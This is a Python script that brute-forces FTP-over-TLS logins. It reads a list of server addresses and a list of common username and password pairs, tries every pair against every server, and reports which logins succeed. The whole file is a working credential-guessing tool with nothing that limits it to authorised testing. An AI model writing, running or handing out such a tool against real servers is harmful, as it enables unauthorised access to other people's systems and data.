from ftplib import FTP_TLS, error_perm

def read_ip_ports(filename):
    with open(filename, 'r') as file:
        return [line.strip().split(':') for line in file.readlines()]

def read_commun(filename):
    with open(filename, 'r') as file:
        return [line.strip().split(':') for line in file.readlines()]

def test_login(ip, port, username, password):
    ftp = FTP_TLS()
    try:
        ftp.connect(ip, int(port))
        ftp.auth()
        ftp.prot_p()
        print(f"Attempting to connect to {ip}:{port} with username: {username} password: {password}")
        try:
            ftp.login(username, password)
            print(f"Login successful for {username} on {ip}:{port}")
            return  # Exit on success
        except error_perm:
            print(f"Login failed for {username} on {ip}:{port}")
    except Exception as e:
        print(f"An error occurred while connecting to {ip}:{port}: {e}")
        return  # Exit the function if connection fails
    finally:
        if 'ftp' in locals() and ftp.sock:
            ftp.quit()
            print("Connection closed")

servers = read_ip_ports('ipport.txt')
credentials = read_commun('commun.txt')

for ip, port in servers:
    print(f"Trying server {ip}:{port}")
    connection_successful = False
    try:
        ftp = FTP_TLS()
        ftp.connect(ip, int(port))
        ftp.auth()
        ftp.prot_p()
        connection_successful = True
    except Exception as e:
        print(f"Failed to connect to {ip}:{port}: {e}")

    if connection_successful:
        for credential in credentials:
            if len(credential) == 2:  # Ensure there are two elements (username and password)
                username, password = credential
                test_login(ip, port, username, password)
            else:
                print(f"Skipping invalid credential line: {credential}")
        
        if 'ftp' in locals() and ftp.sock:
            ftp.quit()
            print("Connection closed for this server")
    else:
        print(f"Skipping login attempts on {ip}:{port} due to connection failure.")

print("All attempts completed.")
